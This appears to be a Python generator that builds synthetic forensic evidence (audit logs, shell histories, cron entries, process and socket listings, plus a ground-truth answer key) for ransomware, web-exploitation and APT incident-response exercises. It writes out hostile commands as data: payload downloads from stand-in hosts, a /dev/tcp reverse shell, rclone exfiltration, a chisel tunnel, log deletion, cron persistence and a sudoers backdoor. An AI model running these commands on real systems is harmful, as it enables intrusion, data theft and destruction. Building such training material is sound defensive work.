...
def audit_exec(
    ...
    *,
    ...
    if path:
        lines.append(
            f'type=PATH msg=audit({timestamp}.000:{audit_id}): item=0 name="{path}" inode={90000 + audit_id} mode=0100755 ouid={uid} ogid={uid}'
        )
    return "\n".join(lines)
...
def common_accounts(root: Path, extra_user: str = "") -> None:
    ...
    if extra_user:
        current_passwd += (
            f"{extra_user}:x:1107:1107:Backup Service:/home/{extra_user}:/bin/bash\n"
        )
    ...
    if extra_user:
        current_shadow += (
            f"{extra_user}:$6$synthetic$not-a-real-hash:20646:0:99999:7:::\n"
        )
...
def generate_ransomware(root: Path) -> None:
    ...
    commands = [
        ...
        (
            1783647000,
            "rclone copy /tmp/finance-backup.tar.gz mega:synthetic-incident-drop --transfers 8",
        ),
        (
            1783647120,
            "/tmp/lockbit --encrypt /srv/finance --extension .lockbit --note RESTORE-MY-FILES.txt",
        ),
    ...
    audit = [
        audit_exec(
            1783646760,
            101,
            ["/usr/bin/curl", "-fsSL", "https://updates.example.invalid/agent.sh"],
            key="exec_from_tmp",
        ),
        audit_exec(
            1783647000,
            ...
            [
                "/usr/bin/rclone",
                "copy",
                "/tmp/finance-backup.tar.gz",
                "mega:synthetic-incident-drop",
            ],
            path="/usr/bin/rclone",
        ),
        audit_exec(
            1783647120,
            103,
            ["/tmp/lockbit", "--encrypt", "/srv/finance", "--extension", ".lockbit"],
            key="exec_from_tmp",
            path="/tmp/lockbit",
        ),
        ...
        audit_exec(
            1783647420,
            105,
            ["/usr/bin/rm", "-f", "/var/log/auth.log", "/var/log/audit/audit.log"],
            key="log_tampering",
        ),
    ]
    ...
    write(
        ...
        "*/5 * * * * root /tmp/lockbit --resume /srv/finance",
    )
    write(
        root,
        "live_response/system/ps_auxwww.txt",
        "root 5220 91.2 1.0 922000 64000 ? Rsl 01:32 00:10 /tmp/lockbit --encrypt /srv/finance --extension .lockbit\nroot 5230 8.1 0.4 250000 22000 ? Sl 01:30 00:02 rclone copy /tmp/finance-backup.tar.gz mega:synthetic-incident-drop",
    )
    write(
        root,
        "live_response/network/ss_-tanp.txt",
        'ESTAB 0 0 10.10.20.15:53120 203.0.113.70:443 users:(("rclone",pid=5230,fd=8))',
    )
    write(
        root,
...
def generate_exploitation(root: Path) -> None:
    ...
    commands = [
        (
            1783757000,
            "curl -fsSL https://cdn.example.invalid/kworker -o /tmp/.cache/kworker",
        ),
        ...
        (
            1783757300,
            "echo '*/10 * * * * www-data /tmp/.cache/kworker --check-in' > /etc/cron.d/app-health",
        ),
    ...
    audit = [
        audit_exec(
            ...
            [
                "/usr/bin/curl",
                "-fsSL",
                "https://cdn.example.invalid/kworker",
                "-o",
                "/tmp/.cache/kworker",
            ],
            key="exec_from_tmp",
            uid="33",
            path="/tmp/.cache/kworker",
        ),
        audit_exec(
            1783757120,
            202,
            ["/tmp/.cache/kworker", "--check-in"],
            key="exec_from_tmp",
            uid="33",
            path="/tmp/.cache/kworker",
        ),
        audit_exec(
            1783757180,
            203,
            ["/usr/bin/bash", "-i", "/dev/tcp/203.0.113.88/4444"],
            uid="33",
        ),
        audit_exec(
            1783757300,
            204,
            ["/usr/bin/tee", "/etc/cron.d/app-health"],
            key="cron_persistence",
            uid="33",
            path="/etc/cron.d/app-health",
        ),
    ]
    write(root, "var/log/audit/audit.log", "\n".join(audit))
    write(
        root,
        "etc/cron.d/app-health",
        "*/10 * * * * www-data /tmp/.cache/kworker --check-in",
    )
    write(
        root,
        "live_response/system/ps_auxwww.txt",
        "www-data 3110 0.8 0.3 193000 18000 ? Sl 08:06 00:01 /tmp/.cache/kworker --check-in\nwww-data 3118 0.1 0.1 12000 4100 ? S 08:06 00:00 bash -i",
    )
    write(
        root,
        "live_response/network/ss_-tanp.txt",
        'ESTAB 0 0 10.10.30.21:53944 203.0.113.88:4444 users:(("bash",pid=3118,fd=3))\nLISTEN 0 128 0.0.0.0:8080 0.0.0.0:* users:(("nginx",pid=801,fd=6))',
    )
    write(
        root,
        "bodyfile/bodyfile.txt",
...
def generate_apt(root: Path) -> None:
    ...
    commands = [
        ...
        (
            1783825560,
            "tar -czf /tmp/research-collection.tar.gz /home /etc /srv/research",
        ),
        (
            1783825680,
            "curl -fsSL https://telemetry.example.invalid/chisel -o /tmp/.sysd",
        ),
        (1783825740, "chmod +x /tmp/.sysd"),
        (1783825800, "/tmp/.sysd client 198.51.100.44:443 R:1080:socks"),
        (
            1783825920,
            "rclone copy /tmp/research-collection.tar.gz s3:synthetic-staging/research",
        ),
    ...
    write(
        ...
        "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAISyntheticPublicKeyOnlyForTraceQuarry apt-synthetic@example.invalid",
    )
    write(
        root,
        "root/.ssh/known_hosts",
        "10.20.30.40 ssh-ed25519 AAAAC3NzaSyntheticKnownHost",
    )
    write(
        root,
        "etc/sudoers.d/svc-backup",
        "svc-backup ALL=(ALL) NOPASSWD: /bin/bash, /usr/bin/systemctl",
    )
    write(
        root,
        "etc/pam.d/sshd",
        "auth optional pam_exec.so quiet /usr/local/lib/security/pam_audit_helper\nauth required pam_unix.so",
    )
    write(
        root,
    ...
    audit = [
        ...
        audit_exec(
            ...
            [
                "/usr/bin/curl",
                "-fsSL",
                "https://telemetry.example.invalid/chisel",
                "-o",
                "/tmp/.sysd",
            ],
            key="exec_from_tmp",
        ...
        audit_exec(
            1783825800,
            303,
            ["/tmp/.sysd", "client", "198.51.100.44:443", "R:1080:socks"],
            key="exec_from_tmp",
            path="/tmp/.sysd",
        ),
        audit_exec(
            1783826040, 304, ["/usr/bin/ssh", "analyst@10.20.30.40", "uname", "-a"]
        ),
...
def main(argv: list[str] | None = None) -> None:
    ...
    for scenario in SCENARIOS:
        ...
        ground_truth = {
            ...
            "host": scenario.host,
            "incident_start": datetime.fromtimestamp(scenario.start, UTC)
            .isoformat()
            .replace("+00:00", "Z"),
            "incident_end": datetime.fromtimestamp(scenario.end, UTC)
            .isoformat()
            .replace("+00:00", "Z"),
